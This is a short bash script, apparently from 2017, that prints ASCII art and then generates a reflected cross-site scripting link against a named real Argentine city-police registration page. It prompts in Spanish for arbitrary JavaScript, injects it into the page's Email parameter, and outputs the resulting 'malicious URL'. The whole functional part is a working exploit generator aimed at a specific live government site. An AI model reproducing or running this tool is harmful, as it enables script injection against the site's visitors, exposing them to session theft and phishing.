#!/bin/bash
#dallas.sh
cat << "EOF"
               .:+shdmmNNNmmmhys+:`               
           -+hNNNmmy/:::::--:::/sdNmy/.           
        -smMNmdsdyoo.````````....-:+ydNdo-        
      :mMNmhyhsdh+o/````  ```..--::/+sydNMy.      
    .yMMdhysdssdhsys+ooo+ossssssosyyyyhhdmMN+     
   `mMmhdyyhsodh+:yyyyyssssssssssosyyyyysoodM+    
   hMddydohhshddoohyo++oo//+/////////:.---:/sN:.. 
  +Mhdymhhdhydddhhd/   `.`       ``````..--:/dMN+ 
/sNmhysd/hd::hdh:-y+   .-`        ```..-:/osyhNM+ 
.NNdmddmdmdhhmmdyydo---/:----:////+ooosyyyhhhhdM/ 
 Ndhd+dyyddsdmmdohmhsyhhssyyoshhyhhyyysyyysso++hy 
:Mmmdydosd+-smd+`odsoshy+shs//sdddyso+++/::-::/oN 
+Nhmmmmddmhydmmyyhd/`.+s+o/.``.+o:``.```..--:/+sM`
+mymydhdmmmhmmmmhddo  `/y+`    -.   `.`..-:+shhdN`
:mhmhdsdmd+/ddyo-ydo   .s+````...```-/+oyyyhyhhym`
:hoymhdmmd+:ddy``+hhoooymdsyyyysoo+oyyhhhyhdsy++d`
-d+/ssdhddhdmmhos+soohmmNNmdhyso+++shdhyo+os/o:+m`
`No/o/o/::/oho+++::.../ydhs/-::--.../s::.-++++:oN`
 mhooy+s:.-:s-.        -s+.   ``  `.:o-../osh+sdd`
-dmmyhdsy+::s/-``.--` `.s+.  `--. `:oo:+shdNmdmdh/
/shdmNNNNNmdddy/:----+o+///:.--::/odmmNMMMNmysss+/
----/oyhdmmNNNNNNmmddho/::/oshmmmNNNNNmdhyys/-...:
--...---:osyoohysyyymdyyyyyhdms+//oysosyo-.--....:
-/-....--:/--/:``./hdhyyyssyhdy+.``-/:-:+:.-::-.-/
`:+ooo+///++o:.-:ohdyoossssyoyhhs//--:+///+oosys/.
 -oho+o++//::::/sdhhy+oosyys+yyyhy/:--:::/+oosos: 
 `:ydhoso+:---.-+hhhy/+++++/:yhyho:..--:+so/+hy:  
   :so.-+sso:-..:+ydyoooos+o+shho:-..-+ss/:`.+-   
    `::.//+hyo::---/+osyyyyso+/----/oyy+//-.:`    
      :/:++osyhy+/:..-/osss+:-.-:/shhso+/:-:`     
       :+++++/oyhhs+/+osssyo+++oyhyo/://///`      
        -o+o+:-:+oyhhhhhhhhhhyyyso/--:++/o`       
         -so+:--::::///+++/:::-::::.-:+os`        
          .ys/-.---..``     ```.....-/so`         
            +s:-.```           ```.-:s:           
             .+:-``             ``-:+`            
               .:-.```       ```.-:.              
                .::---.`````.---::.               
                 ./----...-----:/.                
                  `.-::://+////-`                  
EOF

echo -e "Dallas.sh\n"
echo -e "2017\n"
urlvulnerable='http://policiadelaciudad.gob.ar/inscribite/validar.php?Email="><script>'
posturlvulnerable='</script>&Codigo_Verificacion=0xplaguedoktor'
read -p "Ingrese el script javascript a ejecutar: " texto_a_ingresar
urlmaliciosa="$urlvulnerable$texto_a_ingresar$posturlvulnerable"
echo -e "\nSe ha creado la URL maliciosa:"
echo -e "\n$urlmaliciosa" | sed 's/\ /%20/g'
